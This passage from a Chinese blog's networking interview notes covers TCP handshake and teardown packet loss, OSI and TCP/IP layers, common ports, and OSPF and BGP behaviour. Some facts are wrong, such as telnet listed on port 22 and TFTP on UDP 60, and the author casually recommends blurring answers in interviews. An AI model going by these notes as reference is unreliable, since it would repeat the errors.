class=\"line\">服务端收到客户的SYN包后，就会回SYN、ACK包，但是客户端一直没有回ACK，服务端在超时后，重传了 </span><br><span class=\"line\">SYN、ACK 包，接着一会，客户端超时重传的SYN包又抵达了服务端，服务端收到后，超时定时器就重新</span><br><span class=\"line\">计时，然后回SYN、ACK包，所以相当于服务端的超时定时器只触发了一次，又被重置了；</span><br><span class=\"line\">当第二次握手的SYN、ACK丢包时，客户端会超时重发SYN包，服务端也会超时重传SYN、ACK包。同时客户端重传次数由tcp_syn_retries决定</span><br><span class=\"line\"></span><br><span class=\"line\">0x02</span><br><span class=\"line\">TCP第三次握手SYN包丢包</span><br><span class=\"line\">如果第三次握手的ACK，服务端无法收到，则服务端就会短暂处于SYN_RECV状态，并且依次等待3秒、6秒、12秒后重新发送SYN+ACK包，而客户端会处于 ESTABLISHED 状态。由于服务端一直收不到TCP第三次握手的ACK，则会一直重传SYN、ACK包，直到重传次数超过tcp_synack_retries,直至重传次数超过tcp_synack_retries</span><br><span class=\"line\"></span><br><span class=\"line\">0x03</span><br><span class=\"line\">// 第一次握手重传次数限制</span><br><span class=\"line\">cat /proc/sys/net/ipv4/tcp_syn_retries</span><br><span class=\"line\"></span><br><span class=\"line\">// 第二次握手重传次数限制</span><br><span class=\"line\">cat /proc/sys/net/ipv4/tcp_synack_retries</span><br><span class=\"line\"></span><br><span class=\"line\">// 数据包最大重传次数限制</span><br><span class=\"line\">cat /proc/sys/net/ipv4/tcp_retries2</span><br><span class=\"line\"></span><br><span class=\"line\">参考链接：https://juejin.cn/post/6844904181795389454</span><br><span class=\"line\">师傅在文章里还有详细截图，看不懂我写的可以去看他写的~</span><br><span class=\"line\"></span><br><span class=\"line\">0x04 TCP第一次挥手FIN包丢包</span><br><span class=\"line\">client发的FIN包丢了，对于client，因为没收对应的ACK包，应当一直重传(像普通包一样)，直至到达上限次数，直接关闭连接；对于server，它应该无任何感知；</span><br><span class=\"line\"> </span><br><span class=\"line\">0x05 TCP第二次挥手ACK包丢包</span><br><span class=\"line\">server回client的ACK包丢了，对于client，将执行（1），对于server将像丢普通的ack一样，再次收到FIN后，再发一个ACK包；</span><br><span class=\"line\"></span><br><span class=\"line\">0x06 TCP第三次挥手FIN包丢包</span><br><span class=\"line\">如果client收到ACK后，server直接跑路。client将永远停留在这个状态（半打开状态，就像client关闭了输出一样）。linux有tcp_fin_timeout这个参数，设置一个超时时间 cat /proc/sys/net/ipv4/tcp_fin_timeout 查看，默认60s。</span><br><span class=\"line\">server发的FIN包丢了，对于server，像丢普通的包一样，重传。若此时client早已跑路且与其他人建立的连接，client应会不认识这个FIN包，直接回个RST包给server。如若client没跑路，且没收到server的FIN包，如（3）描述；</span><br><span class=\"line\"></span><br><span class=\"line\">0x07 TCP第三次挥手ACK包丢包</span><br><span class=\"line\">防止回复的ACK包丢失（丢失后，server因为没收FIN的ACK，所以会再发一个FIN），将等待2MSL(最大报文存活时间)</span><br><span class=\"line\"></span><br><span class=\"line\">0x08 大结局</span><br><span class=\"line\">syn = 1丢了 计时器超时后重传第一个包(syn=1)</span><br><span class=\"line\">syn = 1, ack = 1丢了 重传第一个(syn=1)和第二个包(syn=1,ack=1)</span><br><span class=\"line\">ack = 1丢了 等待3秒、6秒、12秒后重新发送第二个(syn=1,ack=1)包</span><br><span class=\"line\">客户端fin = 1丢了 重传第一个包(fin=1)</span><br><span class=\"line\">服务端ack = 1丢了 重传第一个(fin=1)和第二个包(ack=1)</span><br><span class=\"line\">服务端fin = 1丢了 服务端重传第三个包(fin=1),client行为分类讨论，如果已经和别人建立了连接，那么回RST，如果没跑路，那么client将永远停留在这个状态(fin-wait)</span><br><span class=\"line\">客户端ack = 1丢了 服务端重传第三个包(fin=1),客户端等待Time-wait，即2MSL</span><br><span class=\"line\">如果他接下来再问你wait-time是干啥的，你直接创他</span><br><span class=\"line\">但我上面写了，别说我没写</span><br><span class=\"line\"></span><br><span class=\"line\">链接：https://www.cnblogs.com/quehualin/p/10409607.html</span><br><span class=\"line\">这个师傅写得很详细，师傅流啤~</span><br></pre></td></tr></table></figure>\n<h4 id=\"连续收到三个ack怎么办云智\"><a class=\"markdownIt-Anchor\" href=\"#连续收到三个ack怎么办云智\">#</a> 连续收到三个 ack 怎么办（云智）</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">即，当TCP源端收到3个相同的ACK确认时，即认为有数据包丢失，则源端重传丢失的数据包，而不必等待RTO(Retransmission Timeout)超时。</span><br><span class=\"line\">https://www.ppkanshu.com/post/4505.html</span><br></pre></td></tr></table></figure>\n<h3 id=\"4osi相关\"><a class=\"markdownIt-Anchor\" href=\"#4osi相关\">#</a> 4.OSI 相关</h3>\n<h4 id=\"路由协议分类宏杉中科曙光信锐\"><a class=\"markdownIt-Anchor\" href=\"#路由协议分类宏杉中科曙光信锐\">#</a> 路由协议分类 (宏杉，中科曙光，信锐)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">从大类分，分为BGP和IGP 即内部网关和边界网关协议</span><br><span class=\"line\">BGP 中只有BGP这一个协议,BGP 又可以称为路径矢量型协议</span><br><span class=\"line\">IGP 中可以分为两大类：</span><br><span class=\"line\">\t距离矢量: RIP,EIGRP(高级的距离矢量型协议，Cisco私有)</span><br><span class=\"line\">\t链路状态：ISIS ,OSPF</span><br><span class=\"line\">然后慢慢扩展吧，千万别说完这个就不说了，你说说每个协议的应用场景等</span><br></pre></td></tr></table></figure>\n<h4 id=\"ositcpip区别\"><a class=\"markdownIt-Anchor\" href=\"#ositcpip区别\">#</a> osi/tcpip 区别</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">OSI:\t\t\t\t\t\t\tTCP/IP</span><br><span class=\"line\">应用层\t\t\t\t\t\t\t应用层\t\t</span><br><span class=\"line\">表示层\t\t\t</span><br><span class=\"line\">会话层</span><br><span class=\"line\">传输层\t\t\t\t\t\t\t传输层</span><br><span class=\"line\">网络层\t\t\t\t\t\t\t网路层</span><br><span class=\"line\">数据链路层\t\t\t\t\t  网络接口层</span><br><span class=\"line\">网络层</span><br><span class=\"line\"></span><br><span class=\"line\">层数不同—-OSI为7层，TCP/IP为四层或五层</span><br><span class=\"line\">TCP/IP支持跨层封装；OSI不支持  跨层封装主要用于非终端设备间相互沟通的流量，非远距离；</span><br><span class=\"line\">TCP/IP仅仅支持IP网络协议;  OSI支持多种网络层协议（IP    IPX    APPLE  TALK    NOVELL   NSAP）</span><br><span class=\"line\">TCP/IP 参考模型没有对网络接口层进行细分，只是一些概念性的描述； OSI 参考模型对服务和协议做了明确的区分。</span><br><span class=\"line\">OSI 先有模型，后有协议规范，适合于描述各种网络；TCP/IP 是先有协议集然后建立模型，不适用于非 TCP/IP 网络。</span><br><span class=\"line\">TCP/IP 一开始就提出面向连接和无连接服务，而 OSI 一开始只强调面向连接服务，直到很晚才开始制定无连接的服务标准。</span><br><span class=\"line\">OSI 实现起来较困难；相反，TCP/IP作为一种简化的分层结构还是比较成功的。</span><br></pre></td></tr></table></figure>\n<h4 id=\"二层三层交换机的区别深信服\"><a class=\"markdownIt-Anchor\" href=\"#二层三层交换机的区别深信服\">#</a> 二层三层交换机的区别 (深信服)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">二层交换机属数据链路层设备</span><br><span class=\"line\">三层交换机工作在网络层</span><br><span class=\"line\"></span><br><span class=\"line\">二层交换机的原理是当交换机从某个端口收到一个数据包，它会先读取包中的源MAC地址，再去读取包中的目的MAC地址，并在地址表中查找对应的端口，如表中有和目的MAC地址对应的端口，就把数据包直接复制到这个端口上。</span><br><span class=\"line\">三层交换机的原理比较简单，就是一次路由多次交换，通俗来说就是第一次进行源到目的的路由，三层交换机会将此数据转到二层，那么下次无论是目的到源还是源到目的都可以进行快速交换。</span><br><span class=\"line\"></span><br><span class=\"line\">二层交换机基于MAC地址访问，只做数据的转发，并且不能配置IP地址</span><br><span class=\"line\">三层交换机将二层交换技术和三层转发功能结合在一起，也就是说三层交换机在二层交换机的基础上增加了路由功能，可配置不同VLAN的IP地址，可通过三层路由实现不同VLAN之间通讯。</span><br><span class=\"line\"></span><br><span class=\"line\">二层交换机主要用于网络接入层和汇聚层</span><br><span class=\"line\">三层交换机主要用于网络核心层，但是也存在少部分三层交换机用于汇聚层的现象</span><br></pre></td></tr></table></figure>\n<h4 id=\"osi每层协议长亭招联中科曙光\"><a class=\"markdownIt-Anchor\" href=\"#osi每层协议长亭招联中科曙光\">#</a> OSI 每层协议 (长亭，招联，中科曙光)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">应用层:</span><br><span class=\"line\">http/https 80/443</span><br><span class=\"line\">dns 53</span><br><span class=\"line\">snmp 161/162</span><br><span class=\"line\">smtp 25</span><br><span class=\"line\">ftp 20/21</span><br><span class=\"line\">pop3 110</span><br><span class=\"line\">telnet 22</span><br><span class=\"line\"></span><br><span class=\"line\">表示层</span><br><span class=\"line\">GIF</span><br><span class=\"line\">JPEG</span><br><span class=\"line\">ASCII</span><br><span class=\"line\">HTML</span><br><span class=\"line\">encryption</span><br><span class=\"line\"></span><br><span class=\"line\">会话层：</span><br><span class=\"line\">NetBIOS</span><br><span class=\"line\">AppleTalk</span><br><span class=\"line\">NFS</span><br><span class=\"line\"></span><br><span class=\"line\">传输层：</span><br><span class=\"line\">tcp</span><br><span class=\"line\">udp</span><br><span class=\"line\"></span><br><span class=\"line\">网络层：</span><br><span class=\"line\">IP，IPX</span><br><span class=\"line\"></span><br><span class=\"line\">数据链路层</span><br><span class=\"line\">FR</span><br><span class=\"line\">HDLC</span><br><span class=\"line\">PPP</span><br><span class=\"line\">802.3</span><br><span class=\"line\">ATM</span><br><span class=\"line\"></span><br><span class=\"line\">物理层</span><br><span class=\"line\">RJ45</span><br><span class=\"line\">Ethernet</span><br><span class=\"line\"></span><br><span class=\"line\">TCP/IP</span><br><span class=\"line\">应用层：参考OSI</span><br><span class=\"line\">传输层：TCP,UDP</span><br><span class=\"line\">网络层：ICMP，IGMP</span><br><span class=\"line\">数据链路层：ARP</span><br><span class=\"line\"></span><br><span class=\"line\">你真想混起来将我觉得也没事，估计面试官也分不清楚，我之前一致混起来讲的，面试官听得挺开心，我讲的也挺开心~</span><br><span class=\"line\">毕竟分太细容易把自己埋了，他不问你不说，大家dddd</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">顺带着我就把常见端口写了</span><br><span class=\"line\">http/https tcp 80/443</span><br><span class=\"line\">dns tcp+udp 53</span><br><span class=\"line\">snmp udp 161/162</span><br><span class=\"line\">smtp tcp 25</span><br><span class=\"line\">ftp tcp 20/21</span><br><span class=\"line\">pop3 tcp 110</span><br><span class=\"line\">telnet 23</span><br><span class=\"line\">dhcp 67/68</span><br><span class=\"line\">ssh 22</span><br><span class=\"line\">tftp udp 60</span><br><span class=\"line\">JBOSS  Tomcat 8080</span><br><span class=\"line\">RDP 3389</span><br><span class=\"line\">Oracle 1521</span><br><span class=\"line\">mssql tcp/udp 1433,1434</span><br><span class=\"line\">mysql 3306</span><br><span class=\"line\">samba 139</span><br><span class=\"line\">ladp 389</span><br><span class=\"line\">redis 6379</span><br><span class=\"line\">weblogic 7001</span><br></pre></td></tr></table></figure>\n<h4 id=\"封装解封装长亭\"><a class=\"markdownIt-Anchor\" href=\"#封装解封装长亭\">#</a> 封装解封装 (长亭)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">应用层，人机交互接口，接收用户输入</span><br><span class=\"line\">表示层，将接收到的数据翻译成二进制数组成的计算机语言，并对数据进行压缩和解压、数据加密和解密等工作</span><br><span class=\"line\">会话层，建立、管理、中止会话。</span><br><span class=\"line\">传输层，为每个数据封装 TCP或UDP 报文头部。 在头部有一个关键的字段信息——端口号，它用于标识上层的协议或应用程序，确保上层应用数据的正常通信。</span><br><span class=\"line\">网络层，上层数据被封装上新的报文头部——IP 头部。 在 IP 头部中有一个关键的字段信息——IP 地址，进行逻辑地址寻址</span><br><span class=\"line\">数据链路层，上层数据被封装一个 MAC 头部，其内部有一个关键的字段信息 ——MAC 地址，在 MAC 头部也同时封装着目标 MAC 地址和源 MAC 地址，进行硬件地址寻址、差错校验等功能。</span><br><span class=\"line\">在物理层，将这些二进制数字组成的比特流转换成电信号在网络中传输。</span><br><span class=\"line\"></span><br><span class=\"line\">在物理层，首先将电信号转换成二进制数据，并将数据送至数据链路层</span><br><span class=\"line\">在数据链路层， 将查看目标 MAC 地址，判断其是否与自己的 MAC 地址吻合，并据此完成后续处理。如果 数据报文的目标 MAC 地址就是自己的 MAC 地址，数据的 MAC 头部将被“拆掉”，并将剩余 的数据送至上一层；如果目标 MAC 地址不是自己的 MAC 地址，对于终端设备来说，它将 会丢弃数据</span><br><span class=\"line\">在网络层与在数据链路层类似，目标 IP 地址将被核实是否与自己的 IP 地址相 同，从而确定是否送至上一层</span><br><span class=\"line\">到了传输层，首先要根据 TCP 头部判断数据段送往哪个应用层协议或应用程序，然后将之前被分组的数据段重组，再送往应用层</span><br><span class=\"line\">会话层，建立、管理、中止会话。</span><br><span class=\"line\">表示层，将接收到的二进制变为应用的数据，并对数据进行压缩和解压、数据加密和解密等工作</span><br><span class=\"line\">在应用层，这些数据将经历复杂的解码过程，以还原发送者所传输的原始信息。</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"5ospf相关\"><a class=\"markdownIt-Anchor\" href=\"#5ospf相关\">#</a> 5.OSPF 相关</h3>\n<h4 id=\"ospf负载分担快手\"><a class=\"markdownIt-Anchor\" href=\"#ospf负载分担快手\">#</a> ospf 负载分担 (快手)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">华为产品文档ospf cost命令原话</span><br><span class=\"line\">当有多条发现协议、开销值、目的地址都相同的路由时，这几条路由就满足负载分担的条件。请根据实际组网情况，通过修改接口开销值来选择是否需要进行负载分担。</span><br></pre></td></tr></table></figure>\n<h4 id=\"需要a-b不负载分担回程不管在哪配开销来回路径不一致有问题吗快手\"><a class=\"markdownIt-Anchor\" href=\"#需要a-b不负载分担回程不管在哪配开销来回路径不一致有问题吗快手\">#</a> 需要 A-&gt;B 不负载分担，回程不管，在哪配开销，来回路径不一致有问题吗（快手）</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在A配，因为A发送时需要查看路由表，只有路由表中没有开销相同的路由才不会负载分担</span><br><span class=\"line\"></span><br><span class=\"line\">路由来回路径不一致虽然还是可以通信，但是可能会出现偶尔访问慢或规律丢包等现象。</span><br><span class=\"line\">因此可考虑配置路由优先级或冗余端口来实现主备。</span><br><span class=\"line\">但对安全设备来说，有影响，可能对应报文会被丢弃。</span><br><span class=\"line\"></span><br><span class=\"line\">华为中fw可以如下操作：</span><br><span class=\"line\">如果出现来回路径不一致情况，不管是在路由模式下，还是在透明模式下，此时默认都是开启的链路状态检测。要解决这个问题，关闭链路状态检测即可，即：</span><br><span class=\"line\">undo firewall session link-state check</span><br></pre></td></tr></table></figure>\n<h4 id=\"单区域网络类型p2p有几种lsa快手\"><a class=\"markdownIt-Anchor\" href=\"#单区域网络类型p2p有几种lsa快手\">#</a> 单区域网络类型 P2P 有几种 LSA (快手)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">只有1类</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020210537797.png\" alt=\"image-20221020210537797\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020210832630.png\" alt=\"image-20221020210832630\"></p>\n<h4 id=\"54lsa常见类型快手\"><a class=\"markdownIt-Anchor\" href=\"#54lsa常见类型快手\">#</a> 5.4LSA 常见类型 (快手)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1类LSA 每台运行ospf协议的路由器都会产生，用于描述加入到OSPF进程中自身直连链路的状态。有路由和拓扑信息</span><br><span class=\"line\">2类LSA 携带DR的router-id，DR接口子网掩码，伪节点的邻居，单区域p2p是没有2类的，有路由和拓扑信息</span><br><span class=\"line\">3类LSA 在区域间传递LSA，只有路由信息</span><br><span class=\"line\">4类LSA ABR产生，描述了ASBR的位置，类似路由信息</span><br><span class=\"line\">5类LSA 外部LSA，携带重发布的路由信息，只有路由信息</span><br><span class=\"line\">7类LSA NSSA区域引入外部路由时产生</span><br></pre></td></tr></table></figure>\n<h4 id=\"55ospf防环快手\"><a class=\"markdownIt-Anchor\" href=\"#55ospf防环快手\">#</a> 5.5OSPF 防环 (快手)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">区域内通过spf防环</span><br><span class=\"line\">区域间通过：</span><br><span class=\"line\">\t区域间水平分割(1类，2类优于3类，骨干3类优于非骨干3类)</span><br><span class=\"line\">\t区域设计原则(非骨干必须和骨干直接相连)</span><br><span class=\"line\">\tABR(只有ABR能产生泛洪3类LSA)</span><br><span class=\"line\">区域间防环:</span><br><span class=\"line\">\t5类LSA在整个区域泛洪时link id,adv rtr,type 都不改变</span><br><span class=\"line\">\tASBR同一区域的路由器通过SPF计算出去往ASBR的无环路径，即通过1类2类防环</span><br><span class=\"line\">\tASBR不同区域的路由器通过4类LSA防环，4类防环规则与3类一致</span><br></pre></td></tr></table></figure>\n<h4 id=\"56spf算法快手\"><a class=\"markdownIt-Anchor\" href=\"#56spf算法快手\">#</a> 5.6SPF 算法 (快手)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://blog.csdn.net/qq_57686163/article/details/123466172</span><br><span class=\"line\">这篇文章师傅写的很明白了，我不想写了，摆烂</span><br></pre></td></tr></table></figure>\n<h4 id=\"57drbdr宏杉\"><a class=\"markdownIt-Anchor\" href=\"#57drbdr宏杉\">#</a> 5.7DR，BDR (宏杉)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">基于链路选择。即在每一条广播型链路或NBMA链路都需要进行DR，BDR选举，BDR可选存在。即在每一条广播型链路或NBMA链路上DR只有一个，BDR如果存在有且只有一个</span><br><span class=\"line\">DR只会从DR的合集当中竞选，BDR只会从BDR的合集当中竞选。如果集合当中有路由器，优先从集合当中竞选。</span><br><span class=\"line\"></span><br><span class=\"line\">DR选举(包含在hello包内)：  1.比较优先级 （范围：0-255，默认优先级为1 ，越大越优）  </span><br><span class=\"line\">2.比较各自的router-id，越大越优</span><br><span class=\"line\"></span><br><span class=\"line\">1.DR抢占是关闭的      </span><br><span class=\"line\">3.优先级范围0-255，数字为0代表不参与选举，默认为1，若两个直连路由器优先级都为0，则不能学习LSA，只能维持邻居关系  </span><br><span class=\"line\">4.先选举BDR ，再升级为DR  (BDR备份路由器，当BDR选举超过40秒后(=dead time),升级为DR，将剩下最优的作为BDR)</span><br><span class=\"line\">当DR BDR选举完成时，会给224.0.0.6发送组播传递LSA，且只有DR和BDR才会接收，DR和BDR在用224.0.0.5发送给所有</span><br></pre></td></tr></table></figure>\n<h4 id=\"58ospf建立邻居\"><a class=\"markdownIt-Anchor\" href=\"#58ospf建立邻居\">#</a> 5.8ospf 建立邻居</h4>\n<blockquote>\n<p>Down: 这是邻居的初始状态，表示没有从邻居收到任何信息。</p>\n<p>Init: 判断邻居参数可以建立邻居后 init。在此状态下，路由器已经从邻居收到了 Hello 报文，但是自己的 router-id 不在所收到的 Hello 报文的邻居列表中，表示尚未与邻居建立双向通信关系，可以称为 one-way。在此状态下的邻居要被包含在自己所发送的 Hello 报文的邻居列表中。</p>\n<p>2-Way: 在此状态下，收到邻居 hello 包，并从 hello 包中发现自己 router-id。两台路由器已确认可以双向通信，邻居关系已经建立；但是还没有建立邻接关系。若发送方收到的 hello 包中有自己 id，可以直接进入 two-way。这是建立邻接关系以前的最高级状态。如果网络为广播网络或者 NBMA 网络则选举 DR/BDR。drother 之间停留此状态，不会进行 LSDB 同步，其他情况会继续进行 LSDB 同步</p>\n<p>exstart 状态，开始发送 DBD 报文。主要完成主从选举，为可靠的 LSDB 同步做准备工作，不会携带任何 LSDB 中 LSA 头部信息</p>\n<p>exchange 主从选举完成后，一旦发送携带 LSA 头部的 DD 报文，则进入 exchange，slave 路由器开始发送携带自身 LSDB 中 LSA 的头部信息的 DBD 报文，并使用</p>\n<p>loading 状态发送 LSR，LSU，LSACK ，LSACK 中会将 LSU 的 Seq 作为自己的 seq，同时携带摘要作为显示确认</p>\n<p>FUll：LSR 重传列表为空，发送和接受 LSACK 报文后，防止同步出现问题。</p>\n<p>attempt— 过度状态，在某些不能发送的 hello 包的网络中，不能主动建立邻居。通过单播邻居方式建立，需要选 DR 时，等待选举状态为 attempt 状态</p>\n<p>停留 attempt 状态说明单播指邻居邻居指错</p>\n</blockquote>\n<h4 id=\"59ospf卡在exstart状态的原因迪普\"><a class=\"markdownIt-Anchor\" href=\"#59ospf卡在exstart状态的原因迪普\">#</a> 5.9ospf 卡在 exstart 状态的原因（迪普）</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">卡在down状态：OSPF没有运行；</span><br><span class=\"line\">卡在init状态：没有收到对方的包；</span><br><span class=\"line\">卡在2-way状态：MA网络没法选举；</span><br><span class=\"line\">卡在exstart状态：MTU不匹配；</span><br><span class=\"line\">卡在loading状态：LSA加载不完全、包交互有问题；</span><br></pre></td></tr></table></figure>\n<h4 id=\"510ospf-影响邻居建立因素迪普\"><a class=\"markdownIt-Anchor\" href=\"#510ospf-影响邻居建立因素迪普\">#</a> 5.10ospf 影响邻居建立因素（迪普）</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">router-id冲突</span><br><span class=\"line\">area id</span><br><span class=\"line\">auth type</span><br><span class=\"line\">auth data</span><br><span class=\"line\">network-mask</span><br><span class=\"line\">hello-interval</span><br><span class=\"line\">dead-interval</span><br><span class=\"line\">options</span><br><span class=\"line\">MTU (DD)</span><br><span class=\"line\">ospf network-type</span><br><span class=\"line\">silent interface</span><br></pre></td></tr></table></figure>\n<h4 id=\"511p2mp-和-p2p-能建邻居吗迪普\"><a class=\"markdownIt-Anchor\" href=\"#511p2mp-和-p2p-能建邻居吗迪普\">#</a> 5.11p2mp 和 p2p 能建邻居吗（迪普）</h4>\n<blockquote>\n<p>可以建立邻居，P2MP 以组播形式发送 hello 报文，P2P 以组播形式发送所有报文</p>\n<p>但 P2P hello 时间 10s，P2MPhello 时间 40s，需要手动修改 hello 时间一致</p>\n</blockquote>\n<h3 id=\"6bgp相关\"><a class=\"markdownIt-Anchor\" href=\"#6bgp相关\">#</a> 6.BGP 相关</h3>\n<h4 id=\"61origin属性network和import都是什么属性优先级origin控制选路快手\"><a class=\"markdownIt-Anchor\" href=\"#61origin属性network和import都是什么属性优先级origin控制选路快手\">#</a> 6.1origin 属性，network 和 import 都是什么属性，优先级，origin 控制选路 (快手)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">定义路径信息的来源。描述该路由是用什么方式成为BGP路由的，公认必尊</span><br><span class=\"line\">1.将IGP路由network到BGP中     i</span><br><span class=\"line\">2.将EGP路由import到BPG中      e</span><br><span class=\"line\">3.将IGP路由import到BGP中      ?</span><br><span class=\"line\">选路时origin  i &gt; e &gt; ?</span><br><span class=\"line\">手动汇总路由继承明细路由中优先级最低起源属性，自动汇总origin全部为incomplete(?)</span><br></pre></td></tr></table></figure>\n<h4 id=\"bgp选路中科闻歌绿盟\"><a class=\"markdownIt-Anchor\" href=\"#bgp选路中科闻歌绿盟\">#</a> bgp 选路（中科闻歌，绿盟）</h4>\n<blockquote>\n<p>1. 优选协议首选值 (PrefVal) 最高的路由</p>\n<p>2. 优选本地优先级 (Local_Pref) 最高的路由</p>\n<p>3. 